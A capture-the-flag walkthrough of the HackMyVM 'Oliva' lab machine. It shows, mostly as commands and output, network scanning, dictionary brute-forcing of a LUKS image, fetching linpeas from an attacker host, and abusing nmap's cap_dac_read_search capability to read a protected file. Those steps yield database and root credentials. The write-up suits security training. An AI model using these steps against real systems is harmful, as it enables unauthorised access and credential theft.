# CTF Penetration Testing

## HackMyVM

### Oliva - Machine

#### Machine Description

- Machine name: [Oliva](https://hackmyvm.eu/machines/machine.php?vm=Oliva)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟩 Easy

<img src="https://hackmyvm.eu/img/vm/oliva.png" alt="Oliva Machine Logo" width="150"/>
#### Machine Writeup

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.123 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.123`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-24 09:46 EDT
Nmap scan report for 192.168.56.123
Host is up (0.00077s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0) ←
80/tcp open  http    nginx 1.22.1 ←
MAC Address: 08:00:27:EE:FC:4F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.36 seconds
```

`curl http://192.168.56.123 -s`:
```html
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

`gobuster dir -u http://192.168.56.123 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 100`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.123
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   400,401,404,500
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,bak,jpg,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 69]
/index.html           (Status: 200) [Size: 615]

[...]
```

`curl http://192.168.56.123/index.php -s`:
```
Hi oliva,
Here the pass to obtain root:


<a href="oliva">CLICK!</a> ←
```

`wget http://192.168.56.123/oliva`:
```
--2024-09-24 09:52:56--  http://192.168.56.123/oliva
Connecting to 192.168.56.123:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20000000 (19M) [application/octet-stream]
Saving to: ‘oliva’

oliva                                           100%[====================================================================================================>]  19.07M  15.6MB/s    in 1.2s    

2024-09-24 09:52:58 (15.6 MB/s) - ‘oliva’ saved [20000000/20000000] ←
```

`file ./oliva`:
```  
./oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offse
```

`bruteforce-luks -f /usr/share/wordlists/rockyou.txt -t 3 ./oliva`:
```
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 970                                        
Tried passwords per second: 1.695804
Last tried password: imissyou

Password found: bebita ←
```

`cryptsetup open ./oliva --type luks oliva`:
```
Enter passphrase for ./oliva: ←
```

`ls -l /dev/mapper`:
```                      
total 0
crw------- 1 root root 10, 236 Sep 24 10:13 control
lrwxrwxrwx 1 root root       7 Sep 24 10:16 oliva -> ../dm-0 ←
```

`ls -l /media/kali/`:
```
total 1
drwxr-xr-x 3 root root 1024 Jul  4  2023 7839beec-705e-45c5-a982-3096ac116f6e ←
```

`ls -alps /media/kali/7839beec-705e-45c5-a982-3096ac116f6e`:
```
total 18
 1 drwxr-xr-x  3 root root  1024 Jul  4  2023 ./
 4 drwxr-x---+ 3 root root  4096 Sep 24 10:17 ../
12 drwx------  2 root root 12288 Jul  4  2023 lost+found/
 1 -rw-r--r--  1 root root    16 Jul  4  2023 mypass.txt ←
```

`cat /media/kali/7839beec-705e-45c5-a982-3096ac116f6e/mypass.txt`:
```
Yesthatsmypass! ←
```

`ssh oliva@192.168.56.123`:
```
oliva@192.168.56.123's password: ←
Linux oliva 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep 24 16:20:27 2024 from 192.168.56.118
```

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>oliva</code> }</b></span>

`whoami`:
```
oliva ←
```

`uname -a`:
```
Linux oliva 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 12 (bookworm)
Release:        12
Codename:       bookworm
```

`ls -alps`:
```
total 32
4 drwx------ 3 oliva oliva 4096 jul  4  2023 ./
4 drwxr-xr-x 3 root  root  4096 jul  4  2023 ../
0 lrwxrwxrwx 1 oliva oliva    9 jul  4  2023 .bash_history -> /dev/null
4 -rw-r--r-- 1 oliva oliva  220 jul  4  2023 .bash_logout
4 -rw-r--r-- 1 oliva oliva 3526 jul  4  2023 .bashrc
4 drwxr-xr-x 3 oliva oliva 4096 jul  4  2023 .local/
4 -rw-r--r-- 1 oliva oliva  807 jul  4  2023 .profile
4 -rw------- 1 oliva oliva   24 jul  4  2023 user.txt ←
4 -rw------- 1 oliva oliva  102 jul  4  2023 .Xauthority
```

`cat ./user.txt`:
```
HMVY0H8NgGJqbFzbgo0VMRm ←
```

`ss -tnlp`:
```
State                 Recv-Q                Send-Q                                Local Address:Port                                 Peer Address:Port                Process                
LISTEN                0                     80                                        127.0.0.1:3306 ←                                    0.0.0.0:*                                          
LISTEN                0                     511                                         0.0.0.0:80                                        0.0.0.0:*                                          
LISTEN                0                     128                                         0.0.0.0:22                                        0.0.0.0:*                                          
LISTEN                0                     511                                            [::]:80                                           [::]:*                                          
LISTEN                0                     128                                            [::]:22                                           [::]:*  
```

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`ls -alps /home/kali/Desktop/tools`:
```
total 10060
   4 drwxrwxr-x 2 kali kali    4096 Sep 23 09:43 ./
   4 drwxr-xr-x 8 kali kali    4096 Sep 14 10:40 ../
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET2.exe
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET35.exe
  56 -rw-r--r-- 1 root root   57344 Apr 11  2023 GodPotato-NET4.exe
2156 -rw-r--r-- 1 root root 2204117 Sep 10 10:00 Invoke-Mimikatz.ps1
 340 -rw-rw-r-- 1 kali kali  347648 Sep  9 06:17 JuicyPotato.exe
 844 -rwxr-xr-x 1 kali kali  860337 Sep 20 04:02 linpeas.sh ←
  48 -rw-rw-r-- 1 kali kali   48875 Sep 19 12:45 lse.sh
  60 -rw-r--r-- 1 root root   59392 Sep  9 13:09 nc.exe
  24 -rw-r--r-- 1 root root   22016 Dec  7  2021 PrintSpoofer32.exe
  28 -rw-r--r-- 1 root root   27136 Dec  7  2021 PrintSpoofer64.exe
2872 -rw-rw-r-- 1 kali kali 2940928 Jan 17  2023 pspy32
3032 -rwxrwxr-x 1 kali kali 3104768 Jan 17  2023 pspy64
  52 -rw-r--r-- 1 root root   51712 May 20  2023 RunasCs.exe
  60 -rw-r--r-- 1 root root   61440 May 17  2023 RunasCs_net2.exe
 368 -rw-rw-r-- 1 kali kali  375176 Sep 23 09:43 socat
```

`python3 -m http.server -d /home/kali/Desktop/tools`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
```

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>oliva</code> }</b></span>

`wget http://192.168.56.118/linpeas.sh -P /tmp`:
```
--2024-09-24 17:35:45--  http://192.168.56.118/linpeas.sh
Conectando con 192.168.56.118:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 860337 (840K) [text/x-sh]
Grabando a: «/tmp/linpeas.sh»

linpeas.sh                                      100%[====================================================================================================>] 840,17K  --.-KB/s    en 0,04s   

2024-09-24 17:35:45 (20,5 MB/s) - «/tmp/linpeas.sh» guardado [860337/860337] ←
```

`chmod +x /tmp/linpeas.sh`
`/tmp/linpeas.sh > /tmp/linpeas_output.txt`:

`cat -n /tmp/linpeas_output.txt`:
```
[...]

201                  ╔════════════════════════════════════════════════╗
   202  ════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                   
   203                  ╚════════════════════════════════════════════════╝                                                                                                                   
   204  ╔══════════╣ Cleaned processes
   205  ╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                          
   206  root           1  0.0  1.2 167508 12036 ?        Ss   15:43   0:01 /sbin/init                                                                                                        
   207  root         204  0.0  1.5  49348 15428 ?        Ss   15:43   0:00 /lib/systemd/systemd-journald
   208  root         231  0.0  0.6  25564  5960 ?        Ss   15:43   0:00 /lib/systemd/systemd-udevd
   209  systemd+     286  0.0  0.6  90040  6664 ?        Ssl  15:43   0:00 /lib/systemd/systemd-timesyncd
   210    └─(Caps) 0x0000000002000000=cap_sys_time
   211  root         326  0.0  0.3   5868  3604 ?        Ss   15:43   0:00 dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
   212  root         349  0.0  0.2   6608  2704 ?        Ss   15:43   0:00 /usr/sbin/cron -f
   213  message+     353  0.0  0.4   9116  4916 ?        Ss   15:43   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
   214    └─(Caps) 0x0000000020000000=cap_audit_write
   215  root         358  0.0  0.8  25348  7952 ?        Ss   15:43   0:00 /lib/systemd/systemd-logind
   216  root         389  0.0  2.2 204504 22068 ?        Ss   15:43   0:01 php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)
   217  www-data     502  0.0  1.2 204992 12764 ?        S    15:43   0:00  _ php-fpm: pool www
   218  www-data     503  0.0  1.1 204992 11020 ?        S    15:43   0:00  _ php-fpm: pool www
   219  root         415  0.0  0.1   5872  1028 tty1     Ss+  15:43   0:00 /sbin/agetty -o -p -- u --noclear - linux
   220  root         445  0.0  0.1  10344  1012 ?        Ss   15:43   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
   221  www-data     449  4.5  0.5  12292  4996 ?        S    15:43   5:07  _ nginx: worker process
   222  oliva        716  0.0  0.6  18044  6868 ?        S    16:20   0:00      _ sshd: oliva@pts/0
   223  oliva        717  0.0  0.4   7968  4816 pts/0    Ss   16:20   0:00          _ -bash
   224  oliva        965  0.4  0.2   3584  2728 pts/0    S+   17:36   0:00              _ /bin/sh /tmp/linpeas.sh
   225  oliva       3591  0.0  0.1   3584  1240 pts/0    S+   17:36   0:00                  _ /bin/sh /tmp/linpeas.sh
   226  oliva       3595  0.0  0.4  11132  4352 pts/0    R+   17:36   0:00                  |   _ ps fauxwww
   227  oliva       3594  0.0  0.1   3584  1240 pts/0    S+   17:36   0:00                  _ /bin/sh /tmp/linpeas.sh
   228  mysql ←      546  0.0 24.4 1070724 240280 ?      Ssl  15:43   0:06 /usr/sbin/mariadbd ←
   229  oliva        692  0.0  1.0  18820 10360 ?        Ss   16:20   0:00 /lib/systemd/systemd --user
   230  oliva        695  0.0  0.3 168564  3000 ?        S    16:20   0:00  _ (sd-pam)

[...]

 439  ╔══════════╣ Active Ports
   440  ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                        
   441  tcp   LISTEN 0      80         127.0.0.1:3306 ←    0.0.0.0:*                                                                                                                         
   442  tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*          
   443  tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*          
   444  tcp   LISTEN 0      511             [::]:80           [::]:*          
   445  tcp   LISTEN 0      128             [::]:22           [::]:* 

[...]

 1015  ╔══════════╣ Capabilities                                                                                                                                                            
  1016  ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                      
  1017  ══╣ Current shell capabilities                                                                                                                                                       
  1018  CapInh:  0x0000000000000000=                                                                                                                                                         
  1019  CapPrm:  0x0000000000000000=
  1020  CapEff:  0x0000000000000000=
  1021  CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  1022  CapAmb:  0x0000000000000000=
  1023
  1024  ══╣ Parent process capabilities
  1025  CapInh:  0x0000000000000000=                                                                                                                                                         
  1026  CapPrm:  0x0000000000000000=
  1027  CapEff:  0x0000000000000000=
  1028  CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
  1029  CapAmb:  0x0000000000000000=
  1030
  1031
  1032  Files with capabilities (limited to 50):
  1033  /usr/bin/nmap cap_dac_read_search=eip ←
  1034  /usr/bin/ping cap_net_raw=ep

[...]

  1142  ╔══════════╣ Files inside others home (limit 20)
  1143  /var/www/html/index.php
  1144  /var/www/html/index.html
```

<img src="./../assets/logo_hacktricks.png" alt="HackTricks Logo"><span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
[Linux Capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables a process to **bypass permissions for reading files and for reading and executing directories**. Its primary use is for file searching or reading purposes. However, it also allows a process to use the `open_by_handle_at(2)` function, which can access any file, including those outside the process's mount namespace. The handle used in `open_by_handle_at(2)` is supposed to be a non-transparent identifier obtained through `name_to_handle_at(2)`, but it can include sensitive information like inode numbers that are vulnerable to tampering. The potential for exploitation of this capability, particularly in the context of Docker containers, was demonstrated by Sebastian Krahmer with the shocker exploit, as analyzed [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3). **This means that you can bypass file read permission checks and directory read/execute permission checks.**

`ls -l /var/www/html/index.php`:
```
-rw-rw---- 1 www-data www-data 163 jul  4  2023 /var/www/html/index.php ←
```

`cat /var/www/html/index.php`:
```
cat: /var/www/html/index.php: Permiso denegado ←
```

`nmap -iL //var/www/html/index.php`:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-24 17:56 CEST
Failed to resolve "Hi".
Failed to resolve "oliva,".
Failed to resolve "Here".
Failed to resolve "the".
Failed to resolve "pass".
Failed to resolve "to".
Failed to resolve "obtain".
Failed to resolve "root:".
Failed to resolve "<?php".
Failed to resolve "$dbname".
Failed to resolve "=".
Failed to resolve "'easy';". ←
Failed to resolve "$dbuser".
Failed to resolve "=".
Failed to resolve "'root';". ←
Failed to resolve "$dbpass".
Failed to resolve "=".
Failed to resolve "'Savingmypass';". ←
Failed to resolve "$dbhost".
Failed to resolve "=".
Failed to resolve "'localhost';".
Failed to resolve "?>".
Failed to resolve "<a".
Unable to split netmask from target expression: "href="oliva">CLICK!</a>"
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.07 seconds
```

`mysql -u root -p`:
```
Enter password: ←
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 11
Server version: 10.11.3-MariaDB-1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```
```
MariaDB [(none)]> show databases; ←
+--------------------+
| Database           |
+--------------------+
| easy               | ←
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0,013 sec)

MariaDB [(none)]> use easy; ←
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```
```
MariaDB [easy]> show tables; ←
+----------------+
| Tables_in_easy |
+----------------+
| logging        | ←
+----------------+
1 row in set (0,000 sec)

MariaDB [easy]> select * from logging; ←
+--------+------+--------------+
| id_log | uzer | pazz         |
+--------+------+--------------+
|      1 | root | OhItwasEasy! | ←
+--------+------+--------------+
1 row in set (0,015 sec)
```
`exit`

`su root`:
```
Contraseña: ←
```

<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>root</code> }</b></span>

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) grupos=0(root) ←
```

`cd /root`
`ls -alps`:
```
total 32
4 drwx------  4 root root 4096 jul  4  2023 ./
4 drwxr-xr-x 18 root root 4096 jul  4  2023 ../
0 lrwxrwxrwx  1 root root    9 jul  4  2023 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  571 abr 10  2021 .bashrc
4 drwxr-xr-x  3 root root 4096 jul  4  2023 .local/
4 -rw-------  1 root root  567 jul  4  2023 .mysql_history
4 -rw-r--r--  1 root root  161 jul  9  2019 .profile
4 -rw-------  1 root root   24 jul  4  2023 rutflag.txt ←
4 drwx------  2 root root 4096 jul  4  2023 .ssh/
```

`cat ./rutflag.txt`:
```
HMVnuTkm4MwFQNPmMJHRyW7 ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
